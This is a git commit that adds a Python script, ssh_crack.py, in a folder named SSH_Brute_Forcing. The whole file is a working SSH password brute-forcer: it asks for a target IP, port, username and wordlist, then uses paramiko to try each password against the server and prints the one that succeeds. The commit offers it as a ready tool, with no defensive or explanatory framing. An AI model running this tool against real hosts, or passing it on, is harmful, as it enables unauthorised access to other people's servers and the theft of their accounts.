4be53b5ebfdc21eb78b5df34c6e55505c88ca6fd
Hamdi Sevben <sevbenhamdi@gmail.com>
2024-03-09 05:01:20 +0300

    Create ssh_crack.py

---
+++ SSH_Brute_Forcing/ssh_crack.py
@@ -0,0 +1,35 @@
+import paramiko,sys,os
+
+target = str(input('Please enter target IP address: '))
+port = str(input('Please enter the SSH port number: '))
+username = str(input('Please enter username to bruteforce: '))
+password_file = str(input('Please enter location of the password file: '))
+
+def ssh_connect(password, code=0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        ssh.connect(target, port, username=username, password=password)
+    except paramiko.AuthenticationException:
+        code = 1
+    ssh.close()
+    return code
+
+with open(password_file, 'r') as file:
+    for line in file.readlines():
+        password = line.strip()
+        
+        try:
+            response = ssh_connect(password)
+
+            if response == 0:
+                 print('password found: '+ password)
+                 exit(0)
+            elif response == 1: 
+                print('no luck')
+        except Exception as e:
+            print(e)
+        pass
+
+file.close()
